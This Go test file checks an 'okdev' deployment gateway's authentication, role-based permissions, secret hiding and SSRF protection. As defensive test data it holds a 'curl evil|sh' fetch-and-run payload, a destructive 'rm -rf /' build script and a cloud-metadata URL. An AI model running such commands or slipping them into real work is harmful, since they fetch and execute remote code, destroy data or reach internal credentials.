package api

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/go-jose/go-jose/v4"
	"github.com/go-jose/go-jose/v4/jwt"

	"github.com/xiaobaowan1988/okdev/internal/deployer"
	"github.com/xiaobaowan1988/okdev/internal/gitrefs"
)

const audience = "okdev"

// fakeIdP 是一个最小的 OIDC 提供方:发现文档 + 公钥,用来签测试令牌。
type fakeIdP struct {
	srv *httptest.Server
	key *rsa.PrivateKey
}

func newIdP(t *testing.T) *fakeIdP {
	t.Helper()
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		t.Fatal(err)
	}
	idp := &fakeIdP{key: key}
	mux := http.NewServeMux()
	mux.HandleFunc("/.well-known/openid-configuration", func(w http.ResponseWriter, _ *http.Request) {
		json.NewEncoder(w).Encode(map[string]any{
			"issuer": idp.srv.URL, "jwks_uri": idp.srv.URL + "/keys",
			"authorization_endpoint": idp.srv.URL + "/auth", "token_endpoint": idp.srv.URL + "/token",
			"id_token_signing_alg_values_supported": []string{"RS256"},
		})
	})
	mux.HandleFunc("/keys", func(w http.ResponseWriter, _ *http.Request) {
		json.NewEncoder(w).Encode(jose.JSONWebKeySet{Keys: []jose.JSONWebKey{{Key: &key.PublicKey, KeyID: "k1", Algorithm: "RS256", Use: "sig"}}})
	})
	idp.srv = httptest.NewServer(mux)
	t.Cleanup(idp.srv.Close)
	return idp
}

func (i *fakeIdP) token(t *testing.T, claims map[string]any, mutate func(*jwt.Claims)) string {
	t.Helper()
	signer, err := jose.NewSigner(jose.SigningKey{Algorithm: jose.RS256, Key: i.key}, (&jose.SignerOptions{}).WithType("JWT").WithHeader("kid", "k1"))
	if err != nil {
		t.Fatal(err)
	}
	std := jwt.Claims{Issuer: i.srv.URL, Subject: "sub1", Audience: jwt.Audience{audience}, Expiry: jwt.NewNumericDate(time.Now().Add(time.Hour)), IssuedAt: jwt.NewNumericDate(time.Now())}
	if mutate != nil {
		mutate(&std)
	}
	raw, err := jwt.Signed(signer).Claims(std).Claims(claims).Serialize()
	if err != nil {
		t.Fatal(err)
	}
	return raw
}

// recordedReq 是 deployer 收到的请求。
type recordedReq struct {
	Method, Path, Auth, Actor string
	Body                      string
}

type fakeDeployer struct {
	srv  *httptest.Server
	mu   sync.Mutex
	reqs []recordedReq
}

func newDeployer(t *testing.T) *fakeDeployer {
	t.Helper()
	d := &fakeDeployer{}
	d.srv = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		d.mu.Lock()
		d.reqs = append(d.reqs, recordedReq{r.Method, r.URL.RequestURI(), r.Header.Get("Authorization"), r.Header.Get("X-Actor"), string(b)})
		d.mu.Unlock()
		switch {
		case strings.HasPrefix(r.URL.Path, "/v1/builders"):
			w.Header().Set("Content-Type", "application/json")
			io.WriteString(w, `[{"name":"api-main","service":"api","repo_url":"https://example.com/api.git","ref":"master","dockerfile":"FROM x","script":"rm -rf /","build_args":{"TOKEN":"s3cr3t"}}]`)
		case strings.HasSuffix(r.URL.Path, "/log"):
			w.Header().Set("Content-Type", "text/plain")
			io.WriteString(w, "build log")
		default:
			w.Header().Set("Content-Type", "application/json")
			io.WriteString(w, `{"ok":true,"script":"echo hi"}`)
		}
	}))
	t.Cleanup(d.srv.Close)
	return d
}

func (d *fakeDeployer) last() recordedReq {
	d.mu.Lock()
	defer d.mu.Unlock()
	if len(d.reqs) == 0 {
		return recordedReq{}
	}
	return d.reqs[len(d.reqs)-1]
}
func (d *fakeDeployer) count() int { d.mu.Lock(); defer d.mu.Unlock(); return len(d.reqs) }

type fakeBuilders struct{ repo *string }

func (f fakeBuilders) GetBuilder(_ context.Context, name string) (*deployer.Builder, error) {
	if name != "api-main" {
		return nil, &deployer.APIError{Status: 404}
	}
	return &deployer.Builder{Name: name, Service: "api", RepoURL: "https://example.com/api.git", Ref: "master"}, nil
}

type fakeRefs struct{ repo *string }

func (f fakeRefs) List(_ context.Context, repo string) (gitrefs.Refs, error) {
	*f.repo = repo
	return gitrefs.Refs{Branches: []string{"master"}, Tags: []string{}, Default: "master"}, nil
}

type env struct {
	idp  *fakeIdP
	dep  *fakeDeployer
	gw   *httptest.Server
	repo string
}

func newEnv(t *testing.T, admins ...string) *env {
	t.Helper()
	e := &env{idp: newIdP(t), dep: newDeployer(t)}
	v, err := NewOIDCVerifier(e.idp.srv.URL, audience, "")
	if err != nil {
		t.Fatal(err)
	}
	du, _ := url.Parse(e.dep.srv.URL)
	s := &Server{Verifier: v, Policy: NewPolicy(admins), Deployer: du, DeployerToken: "deployer-secret",
		Builders: fakeBuilders{}, Refs: fakeRefs{&e.repo}, Log: slog.New(slog.NewTextHandler(io.Discard, nil))}
	e.gw = httptest.NewServer(s.Handler())
	t.Cleanup(e.gw.Close)
	return e
}

func (e *env) do(t *testing.T, method, path, token, body string, hdr ...string) (int, string) {
	t.Helper()
	req, _ := http.NewRequest(method, e.gw.URL+path, strings.NewReader(body))
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}
	for i := 0; i+1 < len(hdr); i += 2 {
		req.Header.Set(hdr[i], hdr[i+1])
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(b)
}

func (e *env) user(t *testing.T, name string) string {
	return e.idp.token(t, map[string]any{"name": name, "email": name + "@okcoin.jp"}, nil)
}

func TestAuthRejectsBadTokens(t *testing.T) {
	e := newEnv(t)
	good := e.user(t, "alice")
	expired := e.idp.token(t, map[string]any{"name": "alice"}, func(c *jwt.Claims) { c.Expiry = jwt.NewNumericDate(time.Now().Add(-time.Hour)) })
	wrongAud := e.idp.token(t, map[string]any{"name": "alice"}, func(c *jwt.Claims) { c.Audience = jwt.Audience{"someone-else"} })
	wrongIss := e.idp.token(t, map[string]any{"name": "alice"}, func(c *jwt.Claims) { c.Issuer = "https://evil.example.com" })
	noName := e.idp.token(t, map[string]any{"email": "alice@okcoin.jp"}, nil)

	if code, _ := e.do(t, "GET", "/v1/envs", good, ""); code != 200 {
		t.Fatalf("valid token rejected: %d", code)
	}
	for name, tok := range map[string]string{"missing": "", "garbage": "not-a-jwt", "expired": expired, "wrong audience": wrongAud, "wrong issuer": wrongIss, "no name claim": noName} {
		before := e.dep.count()
		code, body := e.do(t, "GET", "/v1/envs", tok, "")
		if code != 401 {
			t.Errorf("%s: want 401, got %d %s", name, code, body)
		}
		if e.dep.count() != before {
			t.Errorf("%s: request must not reach deployer", name)
		}
	}
}

func TestActorComesFromTokenAndCredentialsAreSwapped(t *testing.T) {
	e := newEnv(t)
	tok := e.user(t, "alice")
	// 调用方伪造 X-Actor,并带自己的 Authorization:都不能传给 deployer
	code, _ := e.do(t, "POST", "/v1/pipelines/build-and-deploy/runs", tok, `{"builder":"api-main","env":"dev3"}`, "X-Actor", "root")
	if code != 200 {
		t.Fatalf("%d", code)
	}
	got := e.dep.last()
	if got.Actor != "alice" {
		t.Fatalf("actor = %q, want alice (a client-supplied X-Actor must be overwritten)", got.Actor)
	}
	if got.Auth != "Bearer deployer-secret" || strings.Contains(got.Auth, tok) {
		t.Fatalf("deployer must get the gateway's token, not the caller's: %q", got.Auth)
	}
	if got.Path != "/v1/pipelines/build-and-deploy/runs" || !strings.Contains(got.Body, `"builder":"api-main"`) {
		t.Fatalf("request not forwarded intact: %+v", got)
	}
}

func TestDeveloperVersusAdmin(t *testing.T) {
	e := newEnv(t, "Root")
	dev, admin := e.user(t, "alice"), e.user(t, "root") // 管理员名单不区分大小写
	cases := []struct {
		method, path string
		dev, admin   int
	}{
		{"GET", "/v1/envs", 200, 200},
		{"GET", "/v1/envs/dev3/services", 200, 200},
		{"GET", "/v1/runs/7/log", 200, 200},
		{"POST", "/v1/pipelines/build-and-deploy/runs", 200, 200}, // 任何环境都能发
		{"POST", "/v1/runs/7/cancel", 200, 200},
		{"PUT", "/v1/envs/prod/services/api", 200, 200},
		{"POST", "/v1/envs/prod/services/api/scale", 200, 200},
		{"DELETE", "/v1/envs/prod/services/api", 403, 200},
		{"POST", "/v1/envs", 403, 200},
		{"DELETE", "/v1/envs/dev3", 403, 200},
		{"POST", "/v1/services", 403, 200},
		{"PUT", "/v1/services/api", 403, 200},
		{"POST", "/v1/builders", 403, 200},
		{"POST", "/v1/templates", 403, 200},
		{"POST", "/v1/pipelines", 403, 200},
		{"PUT", "/v1/builders/api-main", 403, 200},
		{"POST", "/other", 403, 403},
		{"GET", "/other", 403, 403},
	}
	for _, c := range cases {
		if code, _ := e.do(t, c.method, c.path, dev, "{}"); code != c.dev {
			t.Errorf("developer %s %s: got %d want %d", c.method, c.path, code, c.dev)
		}
		if code, _ := e.do(t, c.method, c.path, admin, "{}"); code != c.admin {
			t.Errorf("admin %s %s: got %d want %d", c.method, c.path, code, c.admin)
		}
	}
}

func TestForbiddenNeverReachesDeployer(t *testing.T) {
	e := newEnv(t)
	before := e.dep.count()
	if code, _ := e.do(t, "POST", "/v1/builders", e.user(t, "alice"), `{"name":"x","script":"curl evil|sh"}`); code != 403 {
		t.Fatal(code)
	}
	if e.dep.count() != before {
		t.Fatal("a forbidden request must not be forwarded")
	}
}

func TestBuildRecipesOnlyForAdmins(t *testing.T) {
	e := newEnv(t, "root")
	_, devBody := e.do(t, "GET", "/v1/builders", e.user(t, "alice"), "")
	for _, leak := range []string{"dockerfile", "script", "build_args", "s3cr3t", "rm -rf"} {
		if strings.Contains(devBody, leak) {
			t.Fatalf("developer response leaks %q: %s", leak, devBody)
		}
	}
	if !strings.Contains(devBody, "repo_url") || !strings.Contains(devBody, "api-main") {
		t.Fatalf("safe fields must remain: %s", devBody)
	}
	_, adminBody := e.do(t, "GET", "/v1/builders", e.user(t, "root"), "")
	if !strings.Contains(adminBody, "dockerfile") || !strings.Contains(adminBody, "build_args") {
		t.Fatalf("admin should see recipes: %s", adminBody)
	}
	// 运行详情里的脚本快照同样不给开发者
	_, run := e.do(t, "GET", "/v1/runs/3", e.user(t, "alice"), "")
	if strings.Contains(run, "script") {
		t.Fatalf("run snapshot leaks script: %s", run)
	}
}

func TestPlainTextLogPassesThrough(t *testing.T) {
	e := newEnv(t)
	code, body := e.do(t, "GET", "/v1/runs/3/log", e.user(t, "alice"), "")
	if code != 200 || body != "build log" {
		t.Fatalf("%d %q", code, body)
	}
}

func TestRefsUsesBuilderRepoOnly(t *testing.T) {
	e := newEnv(t)
	tok := e.user(t, "alice")
	code, body := e.do(t, "GET", "/refs?builder=api-main", tok, "")
	if code != 200 || e.repo != "https://example.com/api.git" || !strings.Contains(body, `"builder_ref":"master"`) {
		t.Fatalf("%d %s repo=%q", code, body, e.repo)
	}
	e.repo = ""
	if code, _ := e.do(t, "GET", "/refs?repo=http://169.254.169.254/", tok, ""); code != 400 || e.repo != "" {
		t.Fatalf("an arbitrary repo URL must not be reachable (code %d, repo %q)", code, e.repo)
	}
	if code, _ := e.do(t, "GET", "/refs?builder=nope", tok, ""); code != 404 {
		t.Fatalf("unknown builder: %d", code)
	}
}

func TestOpenEndpointsNeedNoToken(t *testing.T) {
	e := newEnv(t)
	if code, _ := e.do(t, "GET", "/healthz", "", ""); code != 200 {
		t.Fatal("healthz")
	}
	code, body := e.do(t, "GET", "/openapi.yaml", "", "")
	if code != 200 || !strings.Contains(body, "openapi: 3.0.3") {
		t.Fatalf("openapi: %d", code)
	}
}

func TestIdentityProviderDownIs503NotUnauthorized(t *testing.T) {
	idp := newIdP(t)
	idp.srv.Close() // 认证服务不可达
	v, _ := NewOIDCVerifier(idp.srv.URL, audience, "")
	du, _ := url.Parse("http://127.0.0.1:1")
	s := &Server{Verifier: v, Policy: NewPolicy(nil), Deployer: du, Log: slog.New(slog.NewTextHandler(io.Discard, nil))}
	srv := httptest.NewServer(s.Handler())
	defer srv.Close()
	req, _ := http.NewRequest("GET", srv.URL+"/v1/envs", nil)
	req.Header.Set("Authorization", "Bearer abc.def.ghi")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	if resp.StatusCode != http.StatusServiceUnavailable {
		t.Fatalf("want 503 (a provider outage is not the caller's fault), got %d", resp.StatusCode)
	}
}

func TestDeployerDownIs502(t *testing.T) {
	e := newEnv(t)
	e.dep.srv.Close()
	if code, _ := e.do(t, "GET", "/v1/envs", e.user(t, "alice"), ""); code != 502 {
		t.Fatalf("got %d", code)
	}
}
